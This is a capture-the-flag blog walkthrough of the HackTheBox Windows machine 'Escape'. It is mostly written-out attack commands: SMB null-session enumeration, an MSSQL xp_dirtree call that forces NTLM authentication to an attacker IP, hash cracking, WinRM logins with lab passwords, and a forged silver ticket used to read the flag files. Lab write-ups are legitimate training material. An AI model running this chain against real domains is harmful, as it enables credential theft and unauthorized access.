---
title: Escape @ HackTheBox - Complete Walkthrough
date: 2025-04-25 13:00:00 
last_modified_at: 2025-04-25 13:00:00
categories: [HTB Machines,Windows Machines]
tags: [hackthebox,escape machine,penetration testing,cybersecurity,walkthrough,windows,active directory]     # TAG names should always be lowercase
comments: true
image:
  path: /./media/post3/Escape.png
  alt: "Escape Machine - HackTheBox Windows Challenge"
author: Ahmed BAHYA
excerpt: "Complete walkthrough of the Escape machine on HackTheBox. Learn Windows penetration testing techniques, privilege escalation, and Active Directory exploitation in this cybersecurity challenge."
description: "Step-by-step walkthrough of the Escape machine on HackTheBox. Master Windows penetration testing, privilege escalation techniques, and Active Directory exploitation in this comprehensive cybersecurity challenge guide."
keywords: [hackthebox, escape machine, windows, penetration testing, cybersecurity, walkthrough, privilege escalation, active directory, exploitation]
canonical_url: https://b2hu.me/posts/Escape-HTB-Walkthrough
---

## Table of Contents
- [Enumeration](#enumeration)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---
**Hello** This is a very simple walkthrough for the windows machine Escape (medium). In this walkthrough we'll practice AD enumeration and Exploitation, without further ado let's get into it.
## Enumeration
we'll start with a an advanced tcp port scan of all of the open ports ($ports)
```shell
sudo nmap -sC -sV -p$ports -oN tcp_scan $IP
```
the scan showes multiple windows AD specific ports open inidicating the machine is a Domain Controller, with a domain name of sequel.htb
after adding the file to /etc/hosts i started enumerarting the services (ldap,smb,etc) and trying to collect information.
After that i found that a Null session was possible in the SMB, so l'ets see whats there :
```shell
smbclient -L //sequel.htb 
```
this command listed the possible share drives, and among them was folder called Public.
```shell
smbclient -U "" //sequel.htb/Public
```
i found a .pdf and i downloaded it using **get**.
Interestingly enough, inside the PDF file, we can find credentials to access the MSSQL instance that we noticed during our initial enumeration, and for this we'll use **impacket-msssqlclient**
```shell
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```
## Foothold
after gaining access i tried many techniques like enabling xp_cmdshell but sadly nothing works, and therefor i tried to force the mssql instance to authenticate to my machine to capture the NTLM hash of the service account responder. 
First let's set up responder :
```shell
sudo responder -I tun0 -v
```
Then, we ask from SQL to list files on our machine using a UNC (Universal Naming Convention) path.
```shell
EXEC MASTER.sys.xp_dirtree '\\10.10.14.7\b2hu', 1, 1
```
back to responder and it seems that he caught the ntlm hash of the user account **sql_svc**, now lets crack it using hashcat (the hash format is NetNTLMv2 and the code is 5600)
```shell
hashcat -m 5600 hash.txt /usr/share/wordlist/rockyou.txt
```
the password seems to be **REGGIE1234ronnie**.
now let's try to authenticate as the user sql_svc over WinRM. We will use evil-winrm.
```shell
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```
## Lateral Movement
we accessed thee sql_svc but there's no **user.txt** file a quick look at the C:\Users folder showed a user **Ryan.Cooper** which indicates that this user might be the target user, while searching for any lead to move to the ryan user i found a log file inside the sqlserver folder, it appears that this user failed to login to the sql instance using this password : **"NuclearMosquito3"**, and this password would most likely be his account's password, let's test it :
```shell
evil-winrm -i sequel.htb -u Ryan.Cooper -p NuclearMosquito3
```
it worked, and now we can retrieve the **user.txt** falg
### PrivEsc
in this step i'll try to forge a ticket for the admin user to access the mssql database and execute xp_cmdshell, this attack verctor is known as **silver ticket**, since we've got the creds for the sql_svc account lets try to get th sid of the domin
```shell
PS C:\Users\Ryan.Cooper\Documents> Get-LocalUser -Name $env:USERNAME | Select sid

SID
---
S-1-5-21-4078382237-1492182817-2568127209-1105
```
the domain SID is all but the last part, next we need the NTLM hash of the svc_sql account, using this <a href=https://codebeautify.org/ntlm-hash-generator>online tool</a> to create it :
```text
1443EC19DA4DAC4FFC953BCA1B57B4CF
```
The spn parameter is needed to produce a valid ticket but we can place anything we want since it's not set
to begin with.
```text
b2hu/DC.SEQUEL.HTB
```
Now, we can craft a ticket for the MSSQL service.
```shell
impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF
-domain-sid S-1-5-21-
4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn
nonexistent/DC.SEQUEL.HTB Administrator
```
Now, we export our ticket and authenticate to the service using Kerberos authentication.
```shell
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k dc.sequel.htb
```
Now, we can use the following queries to read the user.txt as well as the root.txt 
```shell
SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS
Contents
SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB)
AS Contents
```